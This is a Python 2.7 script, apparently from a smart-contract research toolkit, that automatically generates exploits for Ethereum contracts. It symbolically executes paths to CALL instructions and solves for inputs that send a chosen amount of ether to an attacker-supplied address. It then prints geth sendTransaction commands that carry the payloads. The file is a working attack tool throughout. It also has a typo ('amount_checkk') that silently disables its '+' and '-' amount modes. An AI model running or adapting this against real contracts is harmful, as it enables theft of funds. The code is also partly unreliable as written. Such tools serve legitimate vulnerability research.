#!/usr/bin/env python2.7
import logging
import sys
from binascii import unhexlify, hexlify

from ethanalyze.constraints import model_to_calls, check_and_model
from ethanalyze.evm import concrete
from ethanalyze.project import Project
from ethanalyze.slicing import backward_slice
from z3 import z3

logging.basicConfig(level=logging.DEBUG)


def trivial_call_exploit(code, target_addr, target_amount, amount_check='='):
    p = Project(code)
    call_ins = p.cfg.filter_ins('CALL')
    if not call_ins:
        logging.info('No CALL instructions')
        return
    logging.info('Found %d CALL instructions' % len(call_ins))
    for call in call_ins:
        # Find slices where the second argument to CALL (destination) is possibly influenced by user-controlled data
        interesting_slices = [bs for bs in backward_slice(call, [1]) if any(
            ins.name in ['ORIGIN', 'CALLER', 'CALLVALUE', 'CALLDATALOAD', 'CALLDATASIZE', 'CALLDATACOPY', 'EXTCODESIZE',
                         'EXTCODECOPY', 'MLOAD', 'SLOAD'] for ins in bs)]
        # Check if ins.bb is set, as slices include padding instructions (PUSH, POP)
        interesting_sub_paths = [[ins.bb.start for ins in bs if ins.bb] for bs in interesting_slices]
        path_count = 0
        pruned = 0
        for path in p.cfg.get_paths(call):
            path_count += 1
            # If this path is NOT a superset of an interesting slice, skip it
            if not any(all(loc in path for loc in sub_path) for sub_path in interesting_sub_paths):
                pruned += 1
                continue
            try:
                state, constraints, sha_constraints = p.run_symbolic(path)

                addr = state.stack[-2]
                amount = state.stack[-3]

                if not concrete(addr):
                    constraints.append(z3.Extract(159, 0, addr) == target_addr)
                else:
                    if addr != target_addr:
                        continue
                if amount_check == '+':
                    constraints.append(amount <= target_amount)
                elif amount_check == '-':
                    constraints.append(amount >= target_amount)
                else:
                    constraints.append(amount == target_amount)

                model = check_and_model(constraints, sha_constraints)

                logging.info('So far checked %d paths (%d pruned)' % (path_count, pruned))
                return model_to_calls(model), constraints, model
            except Exception as e:
                logging.exception('Failed path due to %s', repr(e))
                pass
    logging.info('Checked %d paths (%d pruned)' % (path_count, pruned))
    logging.info('Could not exploit any CALL')
    return


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print 'Usage: %s <code> <target-address> <amount>' % sys.argv[0]
        exit(-1)
    with open(sys.argv[1]) as infile:
        inbuffer = infile.read().rstrip()
    amount_check = '='
    amount = sys.argv[3].strip()
    if amount[0] in ('=', '+', '-'):
        amount_checkk = amount[0]
        amount = amount[1:]
    amount = int(amount)
    code = unhexlify(inbuffer)
    result = trivial_call_exploit(code, int(sys.argv[2], 16), amount, amount_check)
    if result:
        call, constraints, model = result
        print call
        print "In geth, use:"
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"})' % (
                int(sys.argv[2], 16), hexlify(c['payload']))
